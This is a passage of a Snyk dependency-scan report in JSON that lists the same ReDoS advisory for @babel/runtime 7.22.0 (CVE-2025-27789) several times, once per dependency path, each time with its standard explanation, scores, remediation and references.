        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "@odlux/framework@0.1.4",
          "@mui/material@5.13.2",
          "react-transition-group@4.4.5",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [
          false,
          "@mui/material@5.13.2",
          "react-transition-group@4.4.5",
          "@babel/runtime@7.28.4"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "@odlux/framework@0.1.4",
          "@mui/styles@5.13.2",
          "jss@10.10.0",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [
          false,
          "@mui/styles@5.18.0",
          "jss@10.10.0",
          "@babel/runtime@7.28.4"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "@odlux/framework@0.1.4",
          "@mui/styles@5.13.2",
          "jss-plugin-camel-case@10.10.0",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [
          false,
          "@mui/styles@5.18.0",
          "jss-plugin-camel-case@10.10.0",
          "@babel/runtime@7.28.4"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "@odlux/framework@0.1.4",
          "@mui/styles@5.13.2",
          "jss-plugin-default-unit@10.10.0",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [
          false,
          "@mui/styles@5.18.0",
          "jss-plugin-default-unit@10.10.0",
          "@babel/runtime@7.28.4"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
